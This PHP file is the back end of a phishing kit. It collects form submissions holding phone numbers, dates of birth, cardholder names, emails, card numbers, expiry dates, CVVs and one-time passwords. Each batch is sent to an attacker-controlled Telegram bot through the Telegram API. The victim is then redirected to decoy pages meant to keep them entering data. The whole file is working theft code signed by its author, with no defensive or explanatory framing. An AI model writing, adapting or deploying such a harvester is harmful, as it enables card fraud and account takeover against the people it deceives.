<?php 
session_start();
require 'config.php';


function sendTotelegram($data){
    global $bot;
    global $chat_id;

    $data = urlencode($data);
    $api = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=$data";
    $c = curl_init($api);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($c);
    curl_close($c);
    return $res;

}




if(isset($_POST['date'])){

$msg = "
DevlopeR BY @kingofak
--------------------------
💎 Phone Number:- ".$_POST['number1']."
💎 Date Of Birth:- ".$_POST['date']."
--------------------------
customer Login $ip
";

sendTotelegram($msg);

header("location: cs.html");

}

$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['name'])){
$_SESSION['_cc'] = $_POST['cc'];
$msg = "
DevlopeR BY @kingofak
--------------------------
💎 CardHolder Name:- ".$_POST['name']."
💎 Mobile Number:- ".$_POST['number2']."
💎 customer Mail :- ".$_POST['email']."
💎 Card Number:- ".$_POST['card-number']."
💎 Card Month :- ".$_POST['EX-Month']."
💎 EX Year:- ".$_POST['exyear']."
💎 CVV No:- ".$_POST['cvv']."
--------------------------
Customer Card Details IP: $ip
";

sendTotelegram($msg);

header("location: ../store/index.html");
    
}
    


if(isset($_POST['login'])){

$msg = "
DevlopeR BY @kingofak
--------------------------
Cc: ".$_SESSION['login']."
Otp: ".$_POST['otp']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

if(isset($_POST['exit'])){
    die(header("location: exit.php"));
}
header("location: wait.php?next=sms.php?error");

}
    



?>